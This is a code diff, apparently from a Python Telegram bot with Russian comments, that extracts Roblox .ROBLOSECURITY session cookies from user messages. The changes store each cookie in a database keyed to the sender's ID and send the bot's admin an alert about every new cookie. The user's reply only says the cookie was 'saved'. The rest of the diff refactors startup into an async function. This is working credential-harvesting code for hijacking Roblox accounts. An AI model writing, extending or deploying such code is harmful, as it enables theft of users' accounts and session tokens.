@@ -51,13 +51,32 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     cookie = extract_roblox_cookie(text)
     
     if cookie:
-        # Здесь можно сохранить куки в базу
+        # Сохраняем в базу
+        try:
+            db = Database()
+            db.save_cookie(user.id, cookie)
+            logger.info(f"💾 Куки сохранен для пользователя {user.id}")
+        except Exception as e:
+            logger.error(f"❌ Ошибка сохранения: {e}")
+        
         await update.message.reply_text(
             f"✅ *Cookie найден!*\n\n"
             f"Длина: {len(cookie)} символов\n"
-            f"Первые 100 символов:\n`{cookie[:100]}...`",
+            f"👤 Ваш ID: `{user.id}`\n"
+            f"🕒 Сохранено в базе данных",
             parse_mode='Markdown'
         )
+        
+        # Уведомляем админа
+        try:
+            config = Config()
+            if config.ADMIN_ID and config.ADMIN_ID != user.id:
+                await context.bot.send_message(
+                    chat_id=config.ADMIN_ID,
+                    text=f"📥 Новый куки от @{user.username or user.id}\nID: {user.id}"
+                )
+        except Exception as e:
+            logger.error(f"❌ Ошибка уведомления админа: {e}")
     else:
         await update.message.reply_text(
             "❌ *Не удалось найти .ROBLOSECURITY куки.*\n\n"
@@ -65,10 +84,10 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
 
-def main():
-    """Основная функция запуска бота"""
+async def main_async():
+    """Асинхронная основная функция"""
     logger.info("=" * 50)
-    logger.info("🚀 ЗАПУСК БОТА TELEGRAM")
+    logger.info("🚀 ЗАПУСК БОТА TELEGRAM (async)")
     logger.info("=" * 50)
     
     try:
@@ -93,7 +112,7 @@ def main():
         logger.info("🔄 Запускаем polling...")
         
         # Запускаем бота
-        application.run_polling(
+        await application.run_polling(
             drop_pending_updates=True,
             allowed_updates=Update.ALL_TYPES
         )
@@ -101,7 +120,11 @@ def main():
     except Exception as e:
         logger.error(f"❌ Ошибка: {e}")
         logger.error(traceback.format_exc())
-        sys.exit(1)
+        raise
+
+def main():
+    """Синхронная обертка для асинхронной функции"""
+    asyncio.run(main_async())
 
 if __name__ == '__main__':
     main()
